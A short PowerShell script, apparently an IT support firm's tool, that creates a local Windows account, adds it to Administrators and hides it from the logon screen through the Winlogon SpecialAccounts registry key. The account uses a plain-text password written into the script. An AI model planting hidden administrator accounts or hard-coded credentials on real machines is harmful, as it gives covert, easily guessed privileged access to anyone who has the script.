# TechRunnerIT - Create local admin account
# requires -runasadministrator
# requires -install or -uninstall to run
# Set script params
param([switch]$install, [switch]$uninstall)

 # Global Vars
Write-Host "Preparing user account details.."

$localAcc = "techrunnerit"
$localAccPass = "B@rn3yGumbl3"
$localAccGroup = "Administrators"
$localAccDescript = "Please contact help@techrunnerit.com"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$name = "techrunnerit"
$value = "0"

Write-Host "User account prepared." -ForegroundColor Green

 # Functions

Function addUser($userName, $pass, $descript)
{
    try
    {
        Write-Host "Creating user account.."
        $compName = $env:COMPUTERNAME
        $cn = [ADSI]"WinNT://$compName"
        $user = $cn.Create('User',$userName)
        $user.SetPassword($pass)
        $user.setinfo()
        $user.description = $descript
        $user.SetInfo()
        Write-Host "User account created." -ForegroundColor Green
    }
    catch
    {
        $_
    }
}

Function addToGroup($userName, $userGroup)
{
    try
    {
        Write-Host "Adding user to administrators..."
        $group = [ADSI]"WinNT://$env:COMPUTERNAME/$userGroup,group"
        $group.Add("WinNT://$env:COMPUTERNAME/$userName,user")
        Write-Host "Successfully admin'd user." -ForegroundColor Green
    }
    catch
    {
        $_
    }
}

Function rmUser($userName)
{
    try
    {
        Write-Host "Removing User account.."
        $compName = $env:COMPUTERNAME
        $cn = [ADSI]"WinNT://$compName"
        $user = $cn.Delete("User", $userName)
    }
    catch
    {
        $_
    }
}

Function hideUser ($registryPath, $name, $value)
{
    try
    {
      New-Item -Path "$registryPath" -Name SpecialAccounts -Force | Out-Null
      New-Item -Path "$registryPath\SpecialAccounts" -Name UserList -Force | Out-Null
      New-ItemProperty -Path "$registryPath\SpecialAccounts\UserList" -Name $localAcc -Value 0 -PropertyType DWord -Force | Out-Null
    }
  catch
  {
      $_
  }
}

 # Main

if ($install)
{
    addUser $localAcc $localAccPass $localAccDescript
    addToGroup $localAcc $localAccGroup
    hideUser $registryPath $name $value
}
elseif ($uninstall)
{
    rmUser $localAcc
}
